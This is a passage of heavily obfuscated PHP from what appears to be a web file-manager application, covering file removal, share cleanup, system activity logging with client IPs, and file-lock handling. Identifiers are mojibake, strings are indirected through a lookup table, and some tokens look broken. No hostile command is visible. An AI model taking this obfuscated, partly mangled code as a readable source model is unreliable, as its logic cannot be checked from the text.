$—ñÈ‡Î¸; $İíñœ•->updateFileEnd($ª¥¤íİê[$ËªÎëƒõ[32]], $ª¥¤íİê[$ËªÎëƒõ[79]]); write_log($ËªÎëƒõ[2329] . $ÌÊıï´õ, $ËªÎëƒõ[1912]); continue; } $ßäÊË¤Ü = IO::move($ÌÊıï´õ, $ƒÆÌ¦Â, REPEAT_RENAME); if (!$ßäÊË¤Ü) { $õÓÜé¸°[] = $—ñÈ‡Î¸; $İíñœ•->updateFileEnd($ª¥¤íİê[$ËªÎëƒõ[32]], $ª¥¤íİê[$ËªÎëƒõ[79]]); write_log($ËªÎëƒõ[2330] . $ÌÊıï´õ, $ËªÎëƒõ[1912]); continue; } $Ù¤ô¼À‘ = array($ËªÎëƒõ[541] => $—ñÈ‡Î¸); $†ø‚ÕÜÅ = array($ËªÎëƒõ[900] => $ò”êğñÀ, $ËªÎëƒõ[87] => $ßäÊË¤Ü); Model($ËªÎëƒõ[230])->where($Ù¤ô¼À‘)->save($†ø‚ÕÜÅ); } $ñ¬ªŞıò = $İíñœ•->task; if (!$ÈÃÃšêî) { Cache::set($»ßè°ÛÊ, $ñ¬ªŞıò); } $İíñœ•->end(); $°‰œ¤ú = array_unique($°‰œ¤ú); $õÓÜé¸° = array_unique($õÓÜé¸°); if (!$ÈÃÃšêî && ($°‰œ¤ú || $õÓÜé¸°)) { $‹ƒøº© = array(); if ($°‰œ¤ú) { $‹ƒøº©[] = sprintf(LNG($ËªÎëƒõ[2331]), count($°‰œ¤ú)); } if ($õÓÜé¸°) { $‹ƒøº©[] = sprintf(LNG($ËªÎëƒõ[2332]), count($õÓÜé¸°)); } $‹ƒøº© = sprintf(LNG($ËªÎëƒõ[2333]), implode($ËªÎëƒõ[2334], $‹ƒøº©)) . $ËªÎëƒõ[2335] . date($ËªÎëƒõ[2336]) . $ËªÎëƒõ[2337]; if ($ëÀ°óñá == $ËªÎëƒõ[1949]) { $‹ƒøº© .= $ËªÎëƒõ[2338] . LNG($ËªÎëƒõ[2339]); } $ñ¬ªŞıò[$ËªÎëƒõ[1275]] = $‹ƒøº©; Cache::set($»ßè°ÛÊ, $ñ¬ªŞıò); unset($¹ŸõÜâ[$ËªÎëƒõ[6]]); $¨°ƒ — = array($ËªÎëƒõ[475] => $®ÕàßŠì, $ËªÎëƒõ[2218] => $ËªÎëƒõ[620], $ËªÎëƒõ[32] => $¹ŸõÜâ[$ËªÎëƒõ[32]], $ËªÎëƒõ[1298] => $¹ŸõÜâ); Hook::trigger($ËªÎëƒõ[1793], array($ËªÎëƒõ[1298] => $¨°ƒ —, $ËªÎëƒõ[1308] => !0)); show_json($‹ƒøº©, !1, 100111); } if ($ëÀ°óñá == $ËªÎëƒõ[620]) { return !0; } if ($°‰œ¤ú || $õÓÜé¸°) { $¦«ƒÜ‰Ö = array_merge($°‰œ¤ú, $õÓÜé¸°); $¦«ƒÜ‰Ö = array_filter(array_unique($¦«ƒÜ‰Ö)); $this->removeByFileID($¦«ƒÜ‰Ö); } if ($˜ëèĞíÊ) { $˜ëèĞíÊ = array_filter(array_unique($˜ëèĞíÊ)); foreach ($˜ëèĞíÊ as $ÌÊıï´õ) { $æä¬×Çï = IO::has($ÌÊıï´õ, !0); if (!$æä¬×Çï[$ËªÎëƒõ[239]] && !$æä¬×Çï[$ËªÎëƒõ[240]]) { IO::remove($ÌÊıï´õ); } } } return $this->remove($®ÕàßŠì); } private function removeByFileID($Ã¸¹§ = array()) { $ÎŒğ˜Šı =& $_SERVER[íïàËŸë]; if (empty($Ã¸¹§)) { return; } $ƒœ÷É = array($ÎŒğ˜Šı[541] => array($ÎŒğ˜Šı[7], $Ã¸¹§)); $œ¸Í¸˜¦ = Model($ÎŒğ˜Šı[1428])->where($ƒœ÷É)->field($ÎŒğ˜Šı[193])->select(); if (!$œ¸Í¸˜¦) { return Model($ÎŒğ˜Šı[544])->remove($Ã¸¹§); } $œ¸Í¸˜¦ = array_to_keyvalue($œ¸Í¸˜¦, $ÎŒğ˜Šı[12], $ÎŒğ˜Šı[193]); foreach ($œ¸Í¸˜¦ as $ØÉÑ¾À¥) { Model($ÎŒğ˜Šı[907])->removeNow($ØÉÑ¾À¥, !1); } } private function removeShareItems($Úú»Û–¨) { $Àá×Ç¦Ù =& $_SERVER[íïàËŸë]; $íºô”ª = "\x7b\151\157\72{$Úú»Û–¨}\175\x2f"; $¦‡æô = array($Àá×Ç¦Ù[193] => 0, $Àá×Ç¦Ù[1268] => array($Àá×Ç¦Ù[459], "{$íºô”ª}\45")); $­±±Œå€ = Model($Àá×Ç¦Ù[1960])->where($¦‡æô)->field($Àá×Ç¦Ù[665])->select(); if (empty($­±±Œå€)) { return; } $Á‘…œÔš = array_to_keyvalue($­±±Œå€, $Àá×Ç¦Ù[12], $Àá×Ç¦Ù[665]); Model($Àá×Ç¦Ù[664])->remove($Á‘…œÔš); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\114\x69\x67\x68\x74\101\160\160"; public $modelType = "\123\x79\x73\164\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array("\156\141\x6d\145", "\x67\x72\x6f\165\x70", "\x64\x65\x73\x63", "\143\157\x6e\164\x65\x6e\164"); public function listData($Üø„›ú£ = false, $õŞ—êË¨ = "\x6d\157\144\x69\146\171\x54\151\155\145", $ŞŞì†Â = true) { return parent::listData($Üø„›ú£, $õŞ—êË¨, $ŞŞì†Â); } public function remove($ìËŸşŠ›) { $×²ê¬Ñû = $this->findByName($ìËŸşŠ›); if (!$×²ê¬Ñû) { return !1; } return parent::remove($×²ê¬Ñû[$_SERVER[íïàËŸë][475]]); } public function add($½é¤ßš¨) { if ($this->findByName($½é¤ßš¨[$_SERVER[íïàËŸë][32]])) { return !1; } return parent::insert($½é¤ßš¨); } public function update($¤Æá´øè, $ÍÔí±Üç) { $Šİ§ø¹™ =& $_SERVER[íïàËŸë]; $†³ıú­û = $this->findByName($¤Æá´øè); $îĞ„‘«ƒ = $this->findByName($ÍÔí±Üç[$Šİ§ø¹™[32]]); if (!$†³ıú­û || $îĞ„‘«ƒ && $îĞ„‘«ƒ[$Šİ§ø¹™[475]] != $†³ıú­û[$Šİ§ø¹™[475]]) { return !1; } return parent::update($†³ıú­û[$Šİ§ø¹™[475]], $ÍÔí±Üç); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\x6d\137\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\156\163\145\162\x74", "\x66\165\156\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $£İÃÀÖÈ =& $_SERVER[íïàËŸë]; return array($£İÃÀÖÈ[2340] => LNG($£İÃÀÖÈ[2341]), $£İÃÀÖÈ[2342] => LNG($£İÃÀÖÈ[2343]), $£İÃÀÖÈ[1923] => LNG($£İÃÀÖÈ[2344]), $£İÃÀÖÈ[2345] => LNG($£İÃÀÖÈ[2346]), $£İÃÀÖÈ[2347] => LNG($£İÃÀÖÈ[2348]), $£İÃÀÖÈ[2349] => LNG($£İÃÀÖÈ[2350]), $£İÃÀÖÈ[2351] => LNG($£İÃÀÖÈ[2352]), $£İÃÀÖÈ[1953] => LNG($£İÃÀÖÈ[2352]), $£İÃÀÖÈ[1954] => LNG($£İÃÀÖÈ[2353]), $£İÃÀÖÈ[2354] => LNG($£İÃÀÖÈ[2355]), $£İÃÀÖÈ[2356] => LNG($£İÃÀÖÈ[2357]), $£İÃÀÖÈ[2358] => LNG($£İÃÀÖÈ[2359]), $£İÃÀÖÈ[2360] => LNG($£İÃÀÖÈ[2361]), $£İÃÀÖÈ[1951] => LNG($£İÃÀÖÈ[2362]), $£İÃÀÖÈ[2363] => LNG($£İÃÀÖÈ[2364]), $£İÃÀÖÈ[1958] => LNG($£İÃÀÖÈ[2365]), $£İÃÀÖÈ[2366] => LNG($£İÃÀÖÈ[2367]), $£İÃÀÖÈ[2368] => LNG($£İÃÀÖÈ[2369]), $£İÃÀÖÈ[2370] => LNG($£İÃÀÖÈ[2371]), $£İÃÀÖÈ[2372] => LNG($£İÃÀÖÈ[2373]), $£İÃÀÖÈ[1961] => LNG($£İÃÀÖÈ[2374]), $£İÃÀÖÈ[1962] => LNG($£İÃÀÖÈ[2375]), $£İÃÀÖÈ[2376] => LNG($£İÃÀÖÈ[2377]), $£İÃÀÖÈ[2378] => LNG($£İÃÀÖÈ[2379]), $£İÃÀÖÈ[2380] => LNG($£İÃÀÖÈ[2381]), $£İÃÀÖÈ[1956] => LNG($£İÃÀÖÈ[2382]), $£İÃÀÖÈ[2383] => LNG($£İÃÀÖÈ[2384]), $£İÃÀÖÈ[1955] => LNG($£İÃÀÖÈ[2385]), $£İÃÀÖÈ[2386] => LNG($£İÃÀÖÈ[2387]), $£İÃÀÖÈ[2388] => LNG($£İÃÀÖÈ[2389]), $£İÃÀÖÈ[2390] => LNG($£İÃÀÖÈ[2389]), $£İÃÀÖÈ[2391] => LNG($£İÃÀÖÈ[2392]), $£İÃÀÖÈ[2393] => LNG($£İÃÀÖÈ[2393]), $£İÃÀÖÈ[2394] => LNG($£İÃÀÖÈ[1927]), $£İÃÀÖÈ[2395] => LNG($£İÃÀÖÈ[2396]), $£İÃÀÖÈ[2397] => LNG($£İÃÀÖÈ[2398]), $£İÃÀÖÈ[2399] => LNG($£İÃÀÖÈ[2400]), $£İÃÀÖÈ[2401] => LNG($£İÃÀÖÈ[2402]), $£İÃÀÖÈ[2403] => LNG($£İÃÀÖÈ[2404]), $£İÃÀÖÈ[2405] => LNG($£İÃÀÖÈ[2405]), $£İÃÀÖÈ[2406] => LNG($£İÃÀÖÈ[2407]), $£İÃÀÖÈ[2408] => LNG($£İÃÀÖÈ[2409]), $£İÃÀÖÈ[2410] => LNG($£İÃÀÖÈ[2411]), $£İÃÀÖÈ[2412] => LNG($£İÃÀÖÈ[2413]), $£İÃÀÖÈ[2414] => LNG($£İÃÀÖÈ[2415]), $£İÃÀÖÈ[2416] => LNG($£İÃÀÖÈ[2417]), $£İÃÀÖÈ[212] => LNG($£İÃÀÖÈ[212]), $£İÃÀÖÈ[213] => LNG($£İÃÀÖÈ[2418]), $£İÃÀÖÈ[2419] => LNG($£İÃÀÖÈ[2419])); } private function typeFile() { $ËÃâ°ãò =& $_SERVER[íïàËŸë]; $¬‹©½’ = array($ËÃâ°ãò[1958] => array($ËÃâ°ãò[1959]), $ËÃâ°ãò[2358] => array($ËÃâ°ãò[2420]), $ËÃâ°ãò[2360] => array($ËÃâ°ãò[2421]), $ËÃâ°ãò[1951] => array($ËÃâ°ãò[1952], $ËÃâ°ãò[2422]), $ËÃâ°ãò[2368] => array(), $ËÃâ°ãò[2370] => array(), $ËÃâ°ãò[2372] => array(), $ËÃâ°ãò[1961] => array($ËÃâ°ãò[1963]), $ËÃâ°ãò[1962] => array($ËÃâ°ãò[1963]), $ËÃâ°ãò[2376] => array($ËÃâ°ãò[2423]), $ËÃâ°ãò[2378] => array($ËÃâ°ãò[2423]), $ËÃâ°ãò[2380] => array($ËÃâ°ãò[2424]), $ËÃâ°ãò[2366] => array($ËÃâ°ãò[2425]), $ËÃâ°ãò[1956] => array($ËÃâ°ãò[2426]), $ËÃâ°ãò[2383] => array($ËÃâ°ãò[2427]), $ËÃâ°ãò[1955] => array($ËÃâ°ãò[1957])); return $¬‹©½’; } private function typeAll() { $äè—šü¸ =& $_SERVER[íïàËŸë]; $²’è‘ø‰ = $this->typeList; $‹×ğñÄ = array_filter($this->typeFile()); foreach ($‹×ğñÄ as $Ş´ĞÄ ¬ => $ñ¶«Â‚•) { $²’è‘ø‰[$ñ¶«Â‚•[0]] = $²’è‘ø‰[$Ş´ĞÄ ¬]; } $²’è‘ø‰[$äè—šü¸[1963]] = LNG($äè—šü¸[2428]); $²’è‘ø‰[$äè—šü¸[2423]] = LNG($äè—šü¸[2429]); return $²’è‘ø‰; } public function addLog($Ÿ§ƒï‰´, $¼ĞÆÌ´À = array()) { $ã±””¯À =& $_SERVER[íïàËŸë]; if (!isset($this->typeList[$Ÿ§ƒï‰´])) { return; } $ãÄäœş¢ = Session::get($ã±””¯À[2121]); if (!$ãÄäœş¢) { $ãÄäœş¢ = _get($¼ĞÆÌ´À, $ã±””¯À[1782], 0); } if ($Ÿ§ƒï‰´ == $ã±””¯À[2395] && is_array($¼ĞÆÌ´À[$ã±””¯À[2430]]) && !$¼ĞÆÌ´À[$ã±””¯À[2430]]) { return; } $¾â†—İÂ = get_client_ip(); if (!$¼ĞÆÌ´À || strlen(json_encode($¼ĞÆÌ´À)) >= 1024 * 64) { if ($¼ĞÆÌ´À && is_array($¼ĞÆÌ´À)) { $¼ĞÆÌ´À = array_intersect_key($¼ĞÆÌ´À, array_flip($ã±””¯À[475], $ã±””¯À[32])); $¼ĞÆÌ´À[$ã±””¯À[2431]] = $¾â†—İÂ; } else { $¼ĞÆÌ´À = array($ã±””¯À[2431] => $¾â†—İÂ); } } else { if (is_array($¼ĞÆÌ´À)) { $¼ĞÆÌ´À[$ã±””¯À[2431]] = $¾â†—İÂ; } else { $¼ĞÆÌ´À = array($ã±””¯À[1298] => $¼ĞÆÌ´À, $ã±””¯À[2431] => $¾â†—İÂ); } } $¼ĞÆÌ´À = array($ã±””¯À[1772] => Session::sign(), $ã±””¯À[1773] => intval($ãÄäœş¢), $ã±””¯À[33] => $Ÿ§ƒï‰´, $ã±””¯À[1775] => json_encode($¼ĞÆÌ´À)); parent::add($¼ĞÆÌ´À); } public function remove($‘‰‰óıè) { $this->where(array($_SERVER[íïàËŸë][493] => $‘‰‰óıè))->delete(); } private function _makeOrder($Çö“‡‘ = '') { $¨ĞÑÑÍø =& $_SERVER[íïàËŸë]; $İ£®©…î = $¨ĞÑÑÍø[231]; $´Àª†Ş = array($¨ĞÑÑÍø[523] => $¨ĞÑÑÍø[524], $¨ĞÑÑÍø[525] => $¨ĞÑÑÍø[526]); $®—ïáø· = Input::get($¨ĞÑÑÍø[531], $¨ĞÑÑÍø[7], $¨ĞÑÑÍø[2157], array($¨ĞÑÑÍø[2075], $¨ĞÑÑÍø[525])); $®—ïáø· = $´Àª†Ş[$®—ïáø·]; $Çö“‡‘ = $Çö“‡‘ . "{$İ£®©…î}\40{$®—ïáø·}"; return $this->order($Çö“‡‘); } public function get($Œ½É‚™ˆ = '') { $ï¼êŸ““ =& $_SERVER[íïàËŸë]; if (!$Œ½É‚™ˆ) { show_json(array()); } $ä¿í€ö = array(); if ($Œ½É‚™ˆ[$ï¼êŸ““[1782]]) { $ä¿í€ö[$ï¼êŸ““[1782]] = $Œ½É‚™ˆ[$ï¼êŸ““[1782]]; } if (isset($Œ½É‚™ˆ[$ï¼êŸ““[843]])) { $¹ÁÓã = $Œ½É‚™ˆ[$ï¼êŸ““[843]]; $øµÖÉŠØ = isset($Œ½É‚™ˆ[$ï¼êŸ““[844]]) ? $Œ½É‚™ˆ[$ï¼êŸ““[844]] : time(); $ä¿í€ö[$ï¼êŸ““[231]] = array($ï¼êŸ““[409], array($¹ÁÓã, $øµÖÉŠØ)); } if ($Œ½É‚™ˆ[$ï¼êŸ““[33]]) { $‰şûı•¿ = explode($ï¼êŸ““[50], $Œ½É‚™ˆ[$ï¼êŸ““[33]]); $ÎÒ€¤½‡ = $this->typeFile(); $›åüğÙœ = array(); foreach ($‰şûı•¿ as $ö„™•ùŒ) { $›åüğÙœ[] = $ö„™•ùŒ; if (isset($ÎÒ€¤½‡[$ö„™•ùŒ])) { $›åüğÙœ = array_merge($›åüğÙœ, $ÎÒ€¤½‡[$ö„™•ùŒ]); } } $›åüğÙœ = array_unique($›åüğÙœ); if ($›åüğÙœ) { $ä¿í€ö[$ï¼êŸ““[33]] = array($ï¼êŸ““[7], $›åüğÙœ); } } else { $ä¿í€ö[$ï¼êŸ““[33]] = array($ï¼êŸ““[2432], $ï¼êŸ““[2433]); } if (!empty($Œ½É‚™ˆ[$ï¼êŸ““[2431]])) { $ä¿í€ö[$ï¼êŸ““[526]] = array($ï¼êŸ““[459], "\45{$Œ½É‚™ˆ[$ï¼êŸ““[2431]]}\45"); } $¹üò’²Ø = $this->_makeOrder()->where($ä¿í€ö)->selectPage(); if (empty($¹üò’²Ø[$ï¼êŸ““[445]])) { show_json(array(), !0, $¹üò’²Ø[$ï¼êŸ““[442]]); } $¹üò’²Ø[$ï¼êŸ““[445]] = $this->logList($¹üò’²Ø[$ï¼êŸ““[445]]); return $¹üò’²Ø; } private function ipAddress(&$ŒÊ¸â­´) { $©Åö¡¢¤ =& $_SERVER[íïàËŸë]; if (!empty($ŒÊ¸â­´[$©Åö¡¢¤[2431]])) { $°êñ«š = IpLocation::get($ŒÊ¸â­´[$©Åö¡¢¤[2431]]); } else { $°êñ«š = LNG($©Åö¡¢¤[2434]); } $ŒÊ¸â­´[$©Åö¡¢¤[2435]] = $°êñ«š; } private function descZipDownload($¢ãÛğæ¤, &$´¬ß½®Å) { $ªÉ‘Ö‹ =& $_SERVER[íïàËŸë]; if (!isset($¢ãÛğæ¤[$ªÉ‘Ö‹[2436]])) { return; } $³‘¿ŒÃ˜ = json_decode($¢ãÛğæ¤[$ªÉ‘Ö‹[2436]], !0); foreach ($³‘¿ŒÃ˜ as $Í”é¢ê) { try { $ó©Êòå¢ = IO::infoFullSimple($Í”é¢ê[$ªÉ‘Ö‹[87]]); } catch (Exception $ù·ö³¼÷) { continue; } $¢ãÛğæ¤[$ªÉ‘Ö‹[87]] = $Í”é¢ê[$ªÉ‘Ö‹[87]]; $´¬ß½®Å[] = $¢ãÛğæ¤[$ªÉ‘Ö‹[193]] = $ó©Êòå¢[$ªÉ‘Ö‹[193]]; $´¬ß½®Å[] = $¢ãÛğæ¤[$ªÉ‘Ö‹[2213]] = $ó©Êòå¢[$ªÉ‘Ö‹[192]]; break; } return $¢ãÛğæ¤; } private function getSourceList(&$ïóÙç€’) { $”¹ÆÖÀ× =& $_SERVER[íïàËŸë]; $ŠƒÙå±ı = array(); foreach ($ïóÙç€’ as $ø–›ÉŠë => $ûªú“å«) { $æ»¢Éö‘ = json_decode($ûªú“å«[$”¹ÆÖÀ×[526]], !0); if ($ûªú“å«[$”¹ÆÖÀ×[33]] == $”¹ÆÖÀ×[1954]) { $æ»¢Éö‘ = $this->descZipDownload($æ»¢Éö‘, $ŠƒÙå±ı); $ïóÙç€’[$ø–›ÉŠë][$”¹ÆÖÀ×[526]] = json_encode($æ»¢Éö‘); continue; } if (strpos($ûªú“å«[$”¹ÆÖÀ×[33]], $”¹ÆÖÀ×[2215]) !== 0) { if (!isset($æ»¢Éö‘[$”¹ÆÖÀ×[87]]) || strpos($ûªú“å«[$”¹ÆÖÀ×[33]], $”¹ÆÖÀ×[2437]) !== 0) { continue; } try { $âÂ«¨ëÊ = IO::infoFullSimple($æ»¢Éö‘[$”¹ÆÖÀ×[87]]); } catch (Exception $ü“ãúÓ) { continue; } $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[193]] = $âÂ«¨ëÊ[$”¹ÆÖÀ×[193]]; $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[2213]] = $âÂ«¨ëÊ[$”¹ÆÖÀ×[192]]; $ïóÙç€’[$ø–›ÉŠë][$”¹ÆÖÀ×[526]] = json_encode($æ»¢Éö‘); continue; } $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[193]]; $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[2213]]; if ($æ»¢Éö‘[$”¹ÆÖÀ×[33]] == $”¹ÆÖÀ×[620]) { $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[526]][$”¹ÆÖÀ×[1252]]; $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[526]][$”¹ÆÖÀ×[1253]]; } if ($æ»¢Éö‘[$”¹ÆÖÀ×[33]] == $”¹ÆÖÀ×[2224]) { $ŠƒÙå±ı[] = $æ»¢Éö‘[$”¹ÆÖÀ×[526]][$”¹ÆÖÀ×[193]]; } } if (!$ŠƒÙå±ı) { return array(); } return Model($”¹ÆÖÀ×[907])->sourceListInfo($ŠƒÙå±ı, !0); } private function logList($Šñ—Àèî) { $Ì°ç¾“Ÿ =& $_SERVER[íïàËŸë]; $È »†€µ = array_to_keyvalue($Šñ—Àèî, $Ì°ç¾“Ÿ[12], $Ì°ç¾“Ÿ[1782]); $½¦Çœ® = Model($Ì°ç¾“Ÿ[598])->userListInfo(array_unique($È »†€µ)); $‰­×¥Àø = $this->getSourceList($Šñ—Àèî); $ÙÑŒí– = $this->typeAll(); $¥öÜÛ®— = array(); $ªÛ…’Ô = array(); foreach ($Šñ—Àèî as $Ú°ûøÍ¦ => $–Â½Ñ¾à) { $°ÔşËê÷ = $–Â½Ñ¾à[$Ì°ç¾“Ÿ[33]]; $µ®‹ÎÆå = isset($½¦Çœ®[$–Â½Ñ¾à[$Ì°ç¾“Ÿ[1782]]]) ? $½¦Çœ®[$–Â½Ñ¾à[$Ì°ç¾“Ÿ[1782]]] : !1; $¦Ã¾è = strpos($°ÔşËê÷, $Ì°ç¾“Ÿ[2438]) === 0 ? LNG($Ì°ç¾“Ÿ[2439]) : LNG($Ì°ç¾“Ÿ[2434]); $–Â½Ñ¾à[$Ì°ç¾“Ÿ[32]] = isset($µ®‹ÎÆå[$Ì°ç¾“Ÿ[32]]) ? $µ®‹ÎÆå[$Ì°ç¾“Ÿ[32]] : LNG($Ì°ç¾“Ÿ[2434]); $–Â½Ñ¾à[$Ì°ç¾“Ÿ[2268]] = isset($µ®‹ÎÆå[$Ì°ç¾“Ÿ[2268]]) ? $µ®‹ÎÆå[$Ì°ç¾“Ÿ[2268]] : $Ì°ç¾“Ÿ[12]; $–Â½Ñ¾à[$Ì°ç¾“Ÿ[1671]] = isset($ÙÑŒí–[$°ÔşËê÷]) ? $ÙÑŒí–[$°ÔşËê÷] : $¦Ã¾è; $–Â½Ñ¾à[$Ì°ç¾“Ÿ[2156]] = $µ®‹ÎÆå; $±ÛöéıÁ = json_decode($–Â½Ñ¾à[$Ì°ç¾“Ÿ[526]], !0); $–Â½Ñ¾à[$Ì°ç¾“Ÿ[2431]] = isset($±ÛöéıÁ[$Ì°ç¾“Ÿ[2431]]) ? $±ÛöéıÁ[$Ì°ç¾“Ÿ[2431]] : $Ì°ç¾“Ÿ[12]; $–Â½Ñ¾à[$Ì°ç¾“Ÿ[2435]] = IpLocation::get($–Â½Ñ¾à[$Ì°ç¾“Ÿ[2431]]); if (strpos($°ÔşËê÷, $Ì°ç¾“Ÿ[2215]) === 0 || isset($±ÛöéıÁ[$Ì°ç¾“Ÿ[2213]])) { $±ÛöéıÁ[$Ì°ç¾“Ÿ[90]] = $‰­×¥Àø[$±ÛöéıÁ[$Ì°ç¾“Ÿ[193]]]; $±ÛöéıÁ[$Ì°ç¾“Ÿ[2229]] = $‰­×¥Àø[$±ÛöéıÁ[$Ì°ç¾“Ÿ[2213]]]; if ($±ÛöéıÁ[$Ì°ç¾“Ÿ[33]] == $Ì°ç¾“Ÿ[620]) { $±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[1252]] = $‰­×¥Àø[$±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[1252]]]; $±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[1253]] = $‰­×¥Àø[$±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[1253]]]; } if ($±ÛöéıÁ[$Ì°ç¾“Ÿ[33]] == $Ì°ç¾“Ÿ[2224]) { $±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[193]] = $‰­×¥Àø[$±ÛöéıÁ[$Ì°ç¾“Ÿ[526]][$Ì°ç¾“Ÿ[193]]]; } if ($±ÛöéıÁ[$Ì°ç¾“Ÿ[33]] == $Ì°ç¾“Ÿ[1949]) { $±ÛöéıÁ[$Ì°ç¾“Ÿ[2229]] = $±ÛöéıÁ[$Ì°ç¾“Ÿ[90]]; $±ÛöéıÁ[$Ì°ç¾“Ÿ[2213]] = $±ÛöéıÁ[$Ì°ç¾“Ÿ[2229]][$Ì°ç¾“Ÿ[193]]; $±ÛöéıÁ[$Ì°ç¾“Ÿ[90]] = !1; $±ÛöéıÁ[$Ì°ç¾“Ÿ[193]] = $Ì°ç¾“Ÿ[12]; } $˜ ÂËÉ¯ = array($Ì°ç¾“Ÿ[1949], $Ì°ç¾“Ÿ[2211]); if (!in_array($±ÛöéıÁ[$Ì°ç¾“Ÿ[33]], $˜ ÂËÉ¯)) { if ($±ÛöéıÁ[$Ì°ç¾“Ÿ[90]] && $±ÛöéıÁ[$Ì°ç¾“Ÿ[90]][$Ì°ç¾“Ÿ[190]] == $Ì°ç¾“Ÿ[191]) { $ªÛ…’Ô[] = $–Â½Ñ¾à[$Ì°ç¾“Ÿ[475]]; unset($Šñ—Àèî[$Ú°ûøÍ¦]); continue; } if ($±ÛöéıÁ[$Ì°ç¾“Ÿ[2229]] && $±ÛöéıÁ[$Ì°ç¾“Ÿ[2229]][$Ì°ç¾“Ÿ[190]] == $Ì°ç¾“Ÿ[191]) { $ªÛ…’Ô[] = $–Â½Ñ¾à[$Ì°ç¾“Ÿ[475]]; unset($Šñ—Àèî[$Ú°ûøÍ¦]); continue; } } } $–Â½Ñ¾à[$Ì°ç¾“Ÿ[526]] = $±ÛöéıÁ; unset($–Â½Ñ¾à[$Ì°ç¾“Ÿ[2440]]); $¥öÜÛ®—[] = $–Â½Ñ¾à; } $this->clearSystemPathLog($ªÛ…’Ô); return $¥öÜÛ®—; } private function clearSystemPathLog($ÜÍ¥ÖŞ) { $î®©¡úø =& $_SERVER[íïàËŸë]; if (count($ÜÍ¥ÖŞ) == 0) { return; } $ÌÀ–ìı = array($î®©¡úø[475] => array($î®©¡úø[7], array_unique($ÜÍ¥ÖŞ))); $this->where($ÌÀ–ìı)->delete(); } public function deviceList($¼—Ú×”ı, $°¦ËÁ¸ó = 0) { $Æ‚º˜‹¨ =& $_SERVER[íïàËŸë]; $·½¬–¾¥ = array($Æ‚º˜‹¨[1782] => $¼—Ú×”ı, $Æ‚º˜‹¨[231] => array($Æ‚º˜‹¨[1103], $°¦ËÁ¸ó), $Æ‚º˜‹¨[33] => $Æ‚º˜‹¨[1923]); $ë¢óÒğ = array(); $«Ù«®ô = $this->field($Æ‚º˜‹¨[2441])->where($·½¬–¾¥)->order($Æ‚º˜‹¨[2227])->limit(50)->select(); foreach ($«Ù«®ô as $ƒõà›ø‘ => $Ã’»¸¹) { if ($ƒõà›ø‘ > 0 && abs($Ã’»¸¹[$Æ‚º˜‹¨[231]] - $«Ù«®ô[$ƒõà›ø‘ - 1][$Æ‚º˜‹¨[231]]) < 5) { continue; } $¢ò¤¾éš = json_decode($Ã’»¸¹[$Æ‚º˜‹¨[526]], !0); $Ã’»¸¹[$Æ‚º˜‹¨[2431]] = isset($¢ò¤¾éš[$Æ‚º˜‹¨[2431]]) ? $¢ò¤¾éš[$Æ‚º˜‹¨[2431]] : $Æ‚º˜‹¨[12]; unset($¢ò¤¾éš[$Æ‚º˜‹¨[2431]]); $’à·à…¶ = $this->deviceType($¢ò¤¾éš[$Æ‚º˜‹¨[2216]]); if (isset($ë¢óÒğ[$’à·à…¶])) { continue; } $Ã’»¸¹[$Æ‚º˜‹¨[2435]] = IpLocation::get($Ã’»¸¹[$Æ‚º˜‹¨[2431]]); $Ã’»¸¹[$Æ‚º˜‹¨[526]] = $¢ò¤¾éš; $ë¢óÒğ[$’à·à…¶] = $Ã’»¸¹; } return array_values($ë¢óÒğ); } public function deviceType($ÓØúøÁ˜) { return $ÓØúøÁ˜; } } goto B²ïİæ½„ó; CË†÷¥¹Ù¾: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($´èÀñò) { $öşÃƒÛ® =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $this->_lockCheck($öşÃƒÛ®[618], $´èÀñò); $ÔöíÇß = 1; $this->_lockEvent($´èÀñò, array($öşÃƒÛ®[619], $öşÃƒÛ®[620]), $ÔöíÇß); $this->_lockParent($´èÀñò, array($öşÃƒÛ®[620]), $ÔöíÇß); $this->_lockEvent($´èÀñò, array($öşÃƒÛ®[621], $öşÃƒÛ®[622]), $ÔöíÇß); $this->_lockCheckEnd($öşÃƒÛ®[618], $´èÀñò); } public function lockCopyEnd($“¡íöµ–) { $…Â‚·çø =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $ì ö’ª = 0; $this->_lockEvent($“¡íöµ–, array($…Â‚·çø[619], $…Â‚·çø[620]), $ì ö’ª); $this->_lockParent($“¡íöµ–, array($…Â‚·çø[620]), $ì ö’ª); $this->_lockEvent($“¡íöµ–, array($…Â‚·çø[621], $…Â‚·çø[622]), $ì ö’ª); } public function lockWriteStart($ì”Ö±ü¼, $ğ•´â = '') { $áÕÎôá =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $this->_lockCheck($áÕÎôá[619], $ì”Ö±ü¼); $á÷–†í¢ = 1; $this->_lockKey($áÕÎôá[623] . $ì”Ö±ü¼ . $áÕÎôá[10] . $ğ•´â, $á÷–†í¢); $this->_lockEvent($ì”Ö±ü¼, array($áÕÎôá[618], $áÕÎôá[620]), $á÷–†í¢); $this->_lockParent($ì”Ö±ü¼, array($áÕÎôá[618], $áÕÎôá[620]), $á÷–†í¢); 